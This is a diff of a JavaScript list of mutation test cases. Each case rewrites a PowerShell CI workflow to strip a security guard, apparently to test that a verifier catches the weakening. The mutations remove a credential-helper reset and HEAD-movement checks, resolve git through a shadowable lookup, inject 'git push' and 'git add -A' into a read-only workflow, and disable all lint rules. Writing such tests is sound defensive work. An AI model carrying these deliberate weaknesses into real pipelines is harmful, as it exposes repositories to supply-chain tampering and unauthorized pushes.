-  ['T1-BUILD-066', 'credential helper reset removed', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_KEY_4'] = 'credential.helper'\n              $objStartInfo.Environment['GIT_CONFIG_VALUE_4'] = ''\n", '')],
-  ['T1-BUILD-067', 'implicit tag propagation re-enabled', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('--no-follow-tags')\n", '')],
-  ['T1-BUILD-068', 'authored push configuration removed', 'build', (source) => replaceOnce(source, '          [System.IO.File]::WriteAllText(\n', '          $null = (\n')],
-  ['T1-BUILD-069', 'fetch refspec added to the authored configuration', 'build', (source) => replaceOnce(source, "`turl = $($arrRemoteUrls[0])`n\"", "`turl = $($arrRemoteUrls[0])`n`tfetch = +refs/heads/*:refs/remotes/origin/*`n\"")],
-  ['T1-BUILD-070', 'HEAD movement check removed from the writer', 'build', (source) => replaceOnce(source, "              throw 'git-state: the generator moved HEAD'\n", "              Write-Host 'head moved'\n")],
-  ['T1-BUILD-071', 'HEAD movement check moved below the early return', 'build', (source) => {
-    const guard = "          $objHeadAfter = Invoke-GitRaw @('rev-parse', 'HEAD')\n          if ($objHeadAfter.ExitCode -ne 0) { throw \"native-tool: HEAD query failed with exit $($objHeadAfter.ExitCode)\" }\n          if ([Convert]::ToBase64String($objHeadAfter.Bytes) -cne [Convert]::ToBase64String($objHeadBefore.Bytes)) {\n              throw 'git-state: the generator moved HEAD'\n          }\n";
-    return replaceOnce(
-      replaceOnce(source, guard, ''),
-      '          & git add -- @arrArtifacts',
-      `${guard}          & git add -- @arrArtifacts`,
-    );
-  }],
-  ['T1-BUILD-072', 'runner communication file check removed', 'build', (source) => replaceOnce(source, "                  throw 'runner-state: the generator wrote to a runner step communication file'\n", "                  Write-Host 'channel written'\n")],
   ['T1-MARKDOWN-020', 'lint asset digest gate removed', 'markdown', (source) => replaceOnce(source, '          if ($strLintConfigHash -cne $strReviewedLintConfigHash -or $strLintHelperHash -cne $strReviewedLintHelperHash) {\n              throw \'supply: lint configuration or helper does not match the reviewed digest\'\n          }\n', '')],
+  ['T1-BUILD-073', 'generator returned to in-session invocation', 'build', (source) => replaceOnce(source, '          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n', '          & ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n')],
+  ['T1-BUILD-074', 'Git resolved through a shadowable command lookup', 'build', (source) => replaceOnce(source, '              $objStartInfo.FileName = $strGitPath\n', '              $objStartInfo.FileName = @(Get-Command git -CommandType Application -ErrorAction Stop)[0].Source\n')],
+  ['T1-BUILD-075', 'pinned Git path downgraded to a mutable variable', 'build', (source) => replaceOnce(source, '          New-Variable -Name strGitPath -Value $strResolvedGit -Option Constant\n', '          $strGitPath = $strResolvedGit\n')],
+  ['T1-BUILD-076', 'push path added to the read-only workflow', 'build', (source) => replaceOnce(source, "          $objWorking = Invoke-GitRaw @('diff'", "          & git push origin HEAD:refs/heads/main\n          $objWorking = Invoke-GitRaw @('diff'")],
+  ['T1-BUILD-077', 'repository mutation added to the read-only workflow', 'build', (source) => replaceOnce(source, "          $objWorking = Invoke-GitRaw @('diff'", "          & git add -A\n          $objWorking = Invoke-GitRaw @('diff'")],
   ['T1-MARKDOWN-021', 'captured lint status reset indirectly through Set-Variable', 'markdown', (source) => replaceOnce(source, '          $intNestedExit = $LASTEXITCODE\n', '          $intNestedExit = $LASTEXITCODE\n          Set-Variable -Name intPolicyExit -Value 0\n')],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
